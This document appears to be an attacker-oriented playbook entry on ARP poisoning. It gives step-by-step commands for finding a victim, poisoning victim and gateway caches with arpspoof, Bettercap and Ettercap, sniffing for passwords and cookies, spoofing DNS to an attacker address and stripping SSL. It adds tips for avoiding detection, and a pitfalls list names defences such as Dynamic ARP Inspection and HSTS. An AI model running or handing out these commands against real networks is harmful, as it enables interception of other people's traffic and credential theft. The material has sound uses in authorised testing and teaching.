# ARP Poisoning (ARP Spoofing)

## When this applies

- Attacker is on the same L2 broadcast domain as victim and gateway (same VLAN/subnet).
- Goal is to insert into the path of victim ↔ gateway traffic by sending forged ARP replies that bind both sides' IPs to the attacker's MAC.
- Common follow-on: cleartext credential capture, SSL stripping, DNS spoofing, downgrade attacks.

## Technique

ARP has no authentication. By unsolicited gratuitous ARP replies (`ARP Reply` for IP X = my MAC), an attacker overwrites the ARP cache of victim hosts. Bidirectional poisoning (victim and gateway both poisoned) routes traffic through the attacker, who must enable IP forwarding to avoid breaking connectivity.

## Steps

### 1. Identify victim and gateway

```bash
# Local subnet enumeration
sudo arp-scan -l                    # auto-detects interface
sudo arp-scan -I eth0 192.168.1.0/24

# Or with nmap
sudo nmap -sn -PR 192.168.1.0/24
```

Note the gateway IP (typically `.1` or `.254`) and the chosen victim's IP/MAC.

### 2. Enable IP forwarding (critical — otherwise victim loses connectivity)

```bash
# Linux
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# macOS
sudo sysctl -w net.inet.ip.forwarding=1
```

### 3. Bidirectional ARP poisoning

```bash
# arpspoof (dsniff suite) — two terminals or background
sudo arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
sudo arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP
```

Each `arpspoof` continuously sends spoofed ARP replies to a target.

### 4. Bettercap (modern, all-in-one)

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets VICTIM_IP;
  set arp.spoof.fullduplex true;
  arp.spoof on;
  net.sniff on
"
```

`fullduplex true` poisons both victim and gateway in one command. `net.sniff` captures the redirected traffic. Add `set net.sniff.regexp 'password|user|cookie|authorization'` to filter.

### 5. Ettercap

```bash
# Curses UI
sudo ettercap -T -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//
```

`arp:remote` enables full-duplex ARP poisoning. Drop `:remote` for single-direction (victim only).

### 6. Capture credentials and sensitive data

```bash
# tcpdump on the attacker — full pcap
sudo tcpdump -i eth0 -w mitm.pcap

# Run in parallel: Bettercap modules
# net.sniff (general), https.proxy (HTTPS-via-proxy), dns.spoof
```

See `scenarios/sniffing/credentials-from-pcap.md` for credential extraction.

### 7. Combine with DNS spoofing

```bash
sudo bettercap -iface eth0 -eval "
  set arp.spoof.targets VICTIM_IP;
  set arp.spoof.fullduplex true;
  arp.spoof on;
  set dns.spoof.domains *.target.com;
  set dns.spoof.address ATTACKER_IP;
  dns.spoof on
"
```

### 8. SSL stripping (HTTP-only redirects)

See `scenarios/mitm/ssl-stripping.md`. Bettercap's `https.proxy` module replaces HTTPS links in served HTML with HTTP equivalents — captures credentials when victims fail to upgrade.

### 9. Cleanup (restore ARP entries)

```bash
# arpspoof: Ctrl-C automatically sends restoration ARPs
# Bettercap: arp.spoof off  (or just exit)
```

Always restore the ARP cache on the way out. Leaving a victim with a poisoned cache breaks their network until ARP entries time out (~5–20 min).

## Verifying success

- Victim's `arp -a` shows the gateway IP bound to the attacker's MAC.
- Captured traffic in pcap shows victim → gateway flows traversing the attacker.
- IP forwarding stats (`/proc/net/snmp` `Ip: ... Forwarding`) increment.

## Common pitfalls

- **Forgetting IP forwarding** — victim loses internet, immediate detection.
- **Switch port security** (sticky MAC, DAI) detects rogue ARPs and shuts the port.
- **Dynamic ARP Inspection (DAI)** with DHCP snooping drops forged ARP replies.
- **Static ARP entries** on the victim's gateway / OS aren't poisoned by the attack.
- **SSL pinning** in mobile/desktop apps defeats SSL stripping for those flows.
- **HSTS preload** prevents HTTP-only attacks against `*.google.com`, `*.github.com`, etc.
- **Wi-Fi client isolation (AP isolation)** blocks clients from talking to each other — ARP poisoning impossible.
- **ARP poisoning is loud** — many EDR/NDR tools alert on duplicate-MAC patterns. Don't run for hours.
- **VLAN-segmented switches** confine ARP to the VLAN — poisoning across VLANs requires VLAN hopping first.

## Tools

- arpspoof (dsniff suite, simple and reliable)
- Bettercap (modern, scriptable, includes proxy modules)
- Ettercap (older curses/GTK tool, plugins for many protocols)
- arp-scan (host discovery — for finding the victim)
- responder (for LLMNR/NBT-NS, often run alongside ARP poisoning)
- mitmproxy (for inline HTTP/S manipulation once traffic is captured)
